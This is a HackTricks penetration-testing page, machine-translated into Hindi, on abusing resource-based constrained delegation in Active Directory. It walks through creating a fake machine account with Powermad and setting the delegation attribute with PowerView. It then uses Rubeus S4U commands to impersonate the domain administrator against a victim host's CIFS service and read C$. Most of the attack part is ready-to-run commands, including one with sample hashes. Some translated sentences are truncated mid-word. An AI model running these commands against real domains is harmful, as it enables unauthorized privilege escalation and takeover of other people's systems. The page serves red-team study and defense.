# рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ

рдпрд╣ рдореВрд▓ [рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛](constrained-delegation.md) рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ рд▓реЗрдХрд┐рди **рдЗрд╕рдХреЗ рдмрдЬрд╛рдп** рдХрд┐рд╕реА **рд╡рд╕реНрддреБ** рдХреЛ **рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреА рдмрдЬрд╛рдп**ред рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛ **рд╡рд╕реНрддреБ рдореЗрдВ рд╕реЗрд╡рд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ**ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕реАрдорд┐рдд рд╡рд╕реНрддреБ рдХреЗ рдкрд╛рд╕ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ рдирд╛рдордХ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛ рдЬреЛ рдЙрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рд╕реЗ рджреВрд╕рд░реЗ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдПрдХ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЕрдВрддрд░ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдХрд┐рд╕реА рдорд╢реАрди рдЦрд╛рддреЗ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрдиреЗ рдкрд░ (_GenericAll/GenericWrite/WriteDacl/WriteProperty/рдЖрджрд┐_) рд╡рд╣ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдореЗрдВ рдЖрдкрдХреЛ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдП рдереЗ)ред

### рдирдП рдЕрд╡рдзрд╛рд░рдгрд╛рдПрдБ

рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдореЗрдВ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ _userAccountControl_ рдорд╛рди рдореЗрдВ **`TrustedToAuthForDelegation`** рдзреНрд╡рдЬ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдПрдХ **S4U2Self** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд▓реЗрдХрд┐рди рдпрд╣ рдкреВрд░реА рддрд░рд╣ рд╕рдЪ рдирд╣реАрдВ рд╣реИред\
рдпрд╣ рд╕рдЪреНрдЪрд╛рдИ рд╣реИ рдХрд┐ рд╡рд╣ рдорд╛рди рди рд╣реЛрдиреЗ рдкрд░ рднреА, рдЖрдк рдПрдХ **рд╕реЗрд╡рд╛** (SPN рд╡рд╛рд▓рд╛) рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл **S4U2Self** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `TrustedToAuthForDelegation` рд╣реИ рддреЛ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓рд╛ TGS **Forwardable** рд╣реЛрдЧрд╛ рдФрд░ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡рд╣ рдзреНрд╡рдЬ рдирд╣реАрдВ рд╣реИ рддреЛ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓рд╛ TGS **Forwardable** рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **S4U2Proxy** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ **TGS** **Forwardable рдирд╣реАрдВ** рд╣реИ рддреЛ рдПрдХ **рдореВрд▓ рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ** рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдкрд░ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**ред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛** рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХрд╛рдо рдХрд░реЗрдЧрд╛ (рдпрд╣ рдХреЛрдИ рдХрдореА рдирд╣реАрдВ рд╣реИ, рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рдЬрд╛рд╣рд┐рд░ рд╣реИ)ред

### рд╣рдорд▓реЗ рдХрд╛ рд╕рдВрд░рдЪрдирд╛

> рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдкреНрдпреВрдЯрд░** рдЦрд╛рддреЗ рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ рддреЛ рдЖрдк рдЙрд╕ рдорд╢реАрди рдореЗрдВ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдорд╛рди рд▓реЗрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рд╡рд┐рдХреНрдЯрд┐рдо рдХрдВрдкреНрдпреВрдЯрд░** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВред

1. рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЦрд╛рддрд╛ рдХреЛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **SPN** рд╣реИ рдпрд╛ рдПрдХ рдмрдирд╛рддрд╛ рд╣реИ (тАЬрд╕реЗрд╡рд╛ AтАЭ)ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** _рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд┐рд╢реЗрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рдПрдХ рд╕реЗ рд▓реЗрдХрд░ 10 **рдХрдВрдкреНрдпреВрдЯрд░ рд╡рд╕реНрддреБрдУрдВ (**_**MachineAccountQuota**_**)** рддрдХ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ SPN рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдмрд╕ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рд╡рд╕реНрддреБ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ SPN рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
2. рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХрдВрдкреНрдпреВрдЯрд░ (рд╕реЗрд╡рд╛ B) рдкрд░ рдЕрдкрдиреЗ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рдЕрдзрд┐рдХрд╛рд░** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реЗрд╡рд╛ A рдХреЛ рдЙрд╕ рд╡рд┐рдХреНрдЯрд┐рдо рдХрдВрдкреНрдпреВрдЯрд░ (рд╕реЗрд╡рд╛ B) рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред
3. рд╣рдорд▓рд╛рд╡рд░ Rubeus рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛** (S4U2Self рдФрд░ S4U2Proxy) рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ A рд╕реЗ рд╕реЗрд╡рд╛ B рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкрд╣реБрдВрдЪ** рдХрд░рддрд╛ рд╣реИред
1. S4U2Self (рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ/рдмрдирд╛рдпрд╛ рдЧрдпрд╛ SPN рд╕реЗ): рдореБрдЭреЗ **рдкреНрд░рд╢рд╛рд╕рдХ рдХрд╛ TGS** рдорд╛рдВрдЧреЗрдВ (Forwardable рдирд╣реАрдВ)ред
2. S4U2Proxy: рдкрд┐рдЫрд▓реЗ рдЪрд░рдг рдХреЗ **Forwardable рдирд╣реАрдВ** TGS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рд╢рд╛рд╕рдХ** рд╕реЗ **рд╡рд┐рдХреНрдЯрд┐рдо рд╣реЛрд╕реНрдЯ** рдХреЗ рд▓рд┐рдП рдПрдХ **TGS** рдорд╛рдВрдЧреЗрдВред
3. рдпрджрд┐ рдЖрдк рдПрдХ Forwardable TGS рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдлрд┐рд░ рднреА рдЖрдк рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
4. рд╣рдорд▓рд╛рд╡рд░ **рдкрд╛рд╕-рдж-рдЯрд┐рдХрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг** рдХрд░рдХреЗ **рд╡рд┐рдХреНрдЯрд┐рдо рд╕реЗрд╡рд╛ B рддрдХ рдкрд╣реБрдВрдЪ** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдбреЛрдореЗрди рдХреА _**MachineAccountQuota**_ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## рд╣рдорд▓рд╛

### рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛

рдЖрдк [powermad](https://github.com/Kevin-Robertson/Powermad) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬ
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛

**activedirectory PowerShell рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**рдкрд╛рд╡рд░рд╡реНрдпреВ рдХрд╛ рдЙрдкрдпреЛрдЧ**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### рдПрдХ рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛ рдХрд░рдирд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдордиреЗ `123456` рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдирдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬ
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
рдпрд╣ рдЙрд╕ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП RC4 рдФрд░ AES рд╣реИрд╢ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ред\
рдЕрдм, рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
рдЖрдк Rubeus рдХреЗ `/altservice` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рд░ рдкреВрдЫрдХрд░ рдЕрдзрд┐рдХ рдЯрд┐рдХрдЯ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ "**рдбреЗрд▓реАрдЧреЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**" рдирд╛рдордХ рдПрдХ рдЧреБрдг рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдпрд╣ рдЧреБрдг рд╕рддреНрдп рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рдХреА рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдВрдЧреЗред рдпрд╣ рдЧреБрдг рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдХреЗ рдЕрдВрджрд░ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### рдкрд╣реБрдВрдЪрдирд╛

рдЖрдЦрд┐рд░реА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди **рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛ рдХрд░реЗрдЧреА рдФрд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕реЗ рдкреАрдбрд╝рд┐рдд рд╣реЛрд╕реНрдЯ рдореЗрдВ TGS** рдХреЛ **рдореЗрдореЛрд░реА** рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдЧреАред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕реЗ **CIFS** рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдПрдХ TGS рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ **C$** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рд╕реНрд╡рддрдВрддреНрд░рддрд╛ рд╣реЛрдЧреА:
```bash
ls \\victim.domain.local\C$
```
### рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

[**рдпрд╣рд╛рдБ рдЙрдкрд▓рдмреНрдз рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ**](silver-ticket.md#available-services).

## рдХрд░реНрдмреЗрд░реЛрд╕ рддреНрд░реБрдЯрд┐рдпрд╛рдБ

* **`KDC_ERR_ETYPE_NOTSUPP`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд░реНрдмреЗрд░реЛрд╕ рдХреЛ DES рдпрд╛ RC4 рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЖрдк рдХреЗрд╡рд▓ RC4 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣реЗ рд╣реИрдВред Rubeus рдХреЛ рдХрдо рд╕реЗ рдХрдо AES256 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ (рдпрд╛ рдмрд╕ rc4, aes128 рдФрд░ aes256 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░реЗрдВ)ред рдЙрджрд╛рд╣рд░рдг: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдХрд╛ рд╕рдордп DC рдХреЗ рд╕рдордп рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдФрд░ рдХрд░реНрдмреЗрд░реЛрд╕ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
* **`preauth_failed`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рджрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рд╣реИрд╢ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЖрдкрдиреЗ рд╢рд╛рдпрдж рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ "$" рдбрд╛рд▓рдирд╛ рднреВрд▓ рдЧрдП рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЖрдк рд╣реИрд╢ рдЬреЗрдирд░реЗрдЯ рдХрд░ рд░рд╣реЗ рд╣реЛ (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
  * рдЖрдк рдЬрд┐рд╕реЗ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЙрд╕реЗ рд╡рд╛рдВрдЫрд┐рдд рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕реЗ рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ)
  * рдкреВрдЫреА рдЧрдИ рд╕реЗрд╡рд╛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ (рдпрджрд┐ рдЖрдк рд╡рд┐рдирд░реНрдо рдХреЗ рд▓рд┐рдП рдЯрд┐рдХрдЯ рдорд╛рдВрдЧрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╡рд┐рдирд░реНрдо рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ)
  * рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдлреЗрдХ рдХрдВрдкреНрдпреВрдЯрд░ рд╡рд┐рдЪрд▓рд┐рдд рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЦреЛ рдЪреБрдХрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
